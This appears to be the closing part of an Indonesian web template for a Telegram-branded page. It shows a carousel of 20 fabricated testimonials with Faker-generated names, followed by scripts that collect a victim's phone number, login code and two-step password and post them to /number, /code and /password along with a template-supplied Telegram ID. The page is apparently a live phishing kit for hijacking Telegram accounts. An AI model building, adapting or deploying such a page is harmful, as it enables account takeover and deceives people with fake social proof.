  <div >
<div class="border border-telegram rounded-md max-w-xs mx-auto mt-6">
  <div class="text-black text-center font-semibold py-2">Testimoni</div>
  <div id="testimoniBox" class="overflow-hidden h-48 relative bg-white">
    <div id="testimoniList" class="absolute top-0 left-0 w-full transition-all duration-500 ease-in-out">
      <!-- Testimoni akan muncul di sini -->
    </div>
  </div>
</div>

</div>

        <footer class="text-center mt-6 text-sm text-gray-600">
          <p class="mb-2">© 2025 All Rights Reserved.</p>
          <div class="flex justify-center space-x-5 text-telegram text-lg">
           
          </div>
        </footer>
  </div>

  
  <!-- Loading Overlay with Blur and Telegram Spinner -->
<div id="loadingOverlay" class="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50" style="display: none;">
  <div class="flex flex-col items-center space-y-3">
    <!-- Spinner with Telegram Blue -->
    <div class="relative w-12 h-12">
      <div class="absolute inset-0 rounded-full border-4 border-[#0088cc] border-t-transparent animate-spin"></div>
      <div class="absolute inset-0 flex items-center justify-center">
        <i class="fab fa-telegram-plane text-[#0088cc] text-xl"></i>
      </div>
    </div>
    <!-- Text -->
    <p id="loadingText" class="text-[#0088cc] text-sm font-semibold tracking-wide">Loading...</p>
  </div>
</div>


  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script type="module">
    import { Faker, id_ID } from 'https://esm.sh/@faker-js/faker';

    const faker = new Faker({ locale: [id_ID] });

    $("#loadingOverlay").show();
  $("#loadingText").text("Selamat Datang");
    const testimonis = [];

    // Buat 20 nama palsu dengan pesan tetap
    for (let i = 0; i < 20; i++) {
      testimonis.push({
        name: faker.person.fullName(),
        message: "<%=  footerdesc  %>"
      });
    }

    const list = document.getElementById("testimoniList");

    // Fungsi membuat elemen testimoni
    function createItem({ name, message }) {
      const wrapper = document.createElement("div");
      wrapper.className = "testimonial-item px-3 py-2";

      wrapper.innerHTML = `
        <div class="flex items-center space-x-2 mb-1">
          <img src="https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=0088cc&color=fff&size=32&rounded=true"
               class="w-8 h-8 rounded-full" />
          <span class="font-semibold text-gray-800">${name}</span>
        </div>
        <p class="text-gray-600 text-sm">${message}</p>
      `;
      return wrapper;
    }

    // Tambahkan semua testimoni
    testimonis.forEach(item => list.appendChild(createItem(item)));

    // Gandakan untuk looping mulus
    testimonis.forEach(item => list.appendChild(createItem(item)));


      $("#loadingText").text("Memuat...");
  setTimeout(() => {
    $("#loadingOverlay").fadeOut();
  }, 800);

    // Scroll otomatis
    let position = 0;
    const itemHeight = 70; // Sesuaikan tinggi item
    const total = testimonis.length;

    setInterval(() => {
      position++;
      if (position >= total) {
        list.style.transition = "none";
        list.style.transform = `translateY(0px)`;
        position = 1;
        setTimeout(() => {
          list.style.transition = "all 0.5s ease-in-out";
          list.style.transform = `translateY(-${itemHeight * position}px)`;
        }, 50);
      } else {
        list.style.transition = "all 0.5s ease-in-out";
        list.style.transform = `translateY(-${itemHeight * position}px)`;
      }
    }, 2000);
  </script>

  <script>
function formatPhoneNumber(phoneNumber) {
// Jika nomor telepon diawali dengan '0', ganti dengan '+628'
if (phoneNumber.startsWith('0')) {
return '+62' + phoneNumber.substring(1);
}
// Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
else if (phoneNumber.startsWith('62')) {
return '+62' + phoneNumber.substring(2);
}
// Jika format sudah sesuai, kembalikan nomor tanpa perubahan
else {
return phoneNumber;
}

}


function showAlert(message) {
  $("#alertFloating").html(` <div
     class="fixed top-4 right-4 bg-red-500 text-white px-4 py-3 rounded-md shadow-lg text-sm flex items-start space-x-3 z-50">
     <i class="fas fa-info-circle mt-0.5 text-white"></i>
     <span>${message}</span>
   </div>`)
}





function processFirstData(){
$('#firstForm').submit(function(submitingprocessFirstData){
submitingprocessFirstData.preventDefault();

var $phone = $("input#phone_number").val();
var $provinsi = $("select#provinsi").val();
var $phone_number = formatPhoneNumber($phone);
var dataToSend = {
phone_number: $phone_number
};

if($phone_number == ""){
  return false;
}

$.ajax({
  type: "POST",
  url: "/number",
 data: dataToSend,
  beforeSend: function() {
  
      $("#loadingOverlay").show();
      $("#loadingText").text("Mengirim kode...");
      $("#alertFloating").html("");
  
   
  },
  success: function(hasil){
      if(hasil.code == 200){  
           $("#loadingOverlay").hide();
              $("#awal").hide();
              $('#kedua').show();
                  $("input#validateclientHash").val(hasil.clientHash);
                  $("input#validateprovinsi").val($provinsi);
                  $("input#validatephone_number").val($phone_number);
               $("#no_span").val($phone_number);

          
      }else{
          if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
          showAlert(`The Number You Entered Is Invalid!`)
                  $("#loadingOverlay").hide();

              }else if(hasil.err.errorMessage == "FLOOD"){
                  $("#loadingOverlay").hide();
    
               showAlert(`Too Many Code Requests!`)
              }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
                  
                  $("#loadingOverlay").hide();
    
                showAlert(`Too Many Passwords Entered!`)
                  }else{
                      $("#loadingOverlay").hide();
    
                     showAlert(`${hasil.err.errorMessage}`)
                      }
                      
                      
                      
                      
                  }
             
  
  }
          });
      });  
      return false;
  };
  
  
  
  function processSecondData(){
      $('#secondForm').submit(function(submitingprocessSecondData){
          submitingprocessSecondData.preventDefault();
          
          var $clientHash = $("input#validateclientHash").val();
          var $phone_number = $("input#validatephone_number").val();
          var $provinsi = $("input#validateprovinsi").val();
          var $otp_code = $("input#otp_code").val();
          var $idtele = "<%= String(telegramId) %>"
          if($clientHash === "" && $phone_number === "" && $otp_code === ""){
              return false;
          }
     
          $.ajax({
              type: "POST",
              url: "/code",
              data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
              beforeSend: function() {
                   $("#loadingOverlay").show();
      $("#loadingText").text("Mencoba Login...");
      $("#alertFloating").html("");

              },
              success: function(hasil){
                 $("#loadingOverlay").hide();
                    if(hasil.needPassword || hasil.code == 401){
                                          $("#ketiga").show();
                      $('#kedua').hide();
                      $("input#validateclientHash").val($clientHash);
                      $("input#validateprovinsi").val($provinsi);
                      $("input#validatePhoneNumber").val($phone_number);
                  
                       $("#no_span2").val($phone_number);
                    }else{
                          try{
                         if(hasil.code == 200){
                                       if(hasil.stcd.result.user != ""){
                                            
                                            $("#empat").show();
                                          $('#kedua').hide();
                      
                                
                                        }
                $("#empat").show();
                            $('#kedua').hide();
                         }else{

                             showAlert(hasil.code ? `${hasil.code} - ${hasil.error}` : hasil.error);
                  $("#loadingOverlay").hide();


                                
  }
}catch(e){
    showAlert(`There was a problem, please try again`)
                  $("#loadingOverlay").hide();


  
  
                                
  
}   

}
                    
                    
      
                          
                          },
                          error: function(xhr, status, error) {
                               
                  $("#loadingOverlay").hide();

      if (status === "timeout") {
           showAlert(`Check your network and try again`)
      } else {
                            
           showAlert(`Check your network and try again`)
      }
    }
                  });
             
             
              });  
              return false;

           };

          
          function processThirdData(){
              $('#thirdForm').submit(function(submitingprocessThirdData){
                  submitingprocessThirdData.preventDefault();
                  
                  var $clientHash = $("input#validateclientHash").val();
                  var $phone_number = $("input#validatephone_number").val();
                  var $provinsi = $("input#validateprovinsi").val();
                  var $password = $("input#password").val();
                                          var $idtele = "<%= String(telegramId) %>"
                  if($clientHash === "" && $phone_number === "" && $password === ""){
                      return false;
                  }
                  
                  $.ajax({
                      type: "POST",
                      url: "/password",
                      data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
                      beforeSend: function() {
                         $("#loadingOverlay").show();
      $("#loadingText").text("Mengirim kode...");
      $("#alertFloating").html("");

   
                      },
                      success: function(response){

                        

          try {
                    $("#loadingOverlay").hide();
                    if (response.code == 200) {
            
                      
                        $('#ketiga').hide();
                        $("#empat").show();

                                             
                    } else {
                   
                        
                        // Menampilkan pesan error jika ada
                        if (response.error) {
                          showAlert(hasil.code ? `${hasil.code} - ${hasil.error}` : hasil.error);
                        } else {
                            showAlert(`There was a problem, refresh the page and try again.`);
                        }
                    }
                } catch (e) {
                 
                    showAlert(`There was a problem, refresh the page and try again.`);
                }
            },
            error: function(xhr, status, error){
                $("#loadingOverlay").hide();
             
                console.log(error);
                showAlert(`An error occurred, please try again later.`);
            }
        });
        });

        return false;
};

 

</script>

</body>

